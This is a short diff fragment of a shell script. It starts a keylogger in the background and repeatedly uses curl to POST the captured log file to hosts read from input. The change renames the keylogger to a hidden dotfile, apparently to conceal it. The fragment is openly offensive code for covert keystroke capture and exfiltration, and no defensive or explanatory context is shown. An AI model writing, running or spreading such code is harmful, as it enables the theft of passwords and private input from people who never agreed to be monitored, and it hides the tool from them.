@@ -32,7 +32,7 @@ echo "
 "
 while read line ; do
 
-python keylogger.py &
+python .keylogger.py &
  for i in {1..1000}; do 
 curl -X POST -d @log.txt $line
 sleep 10;
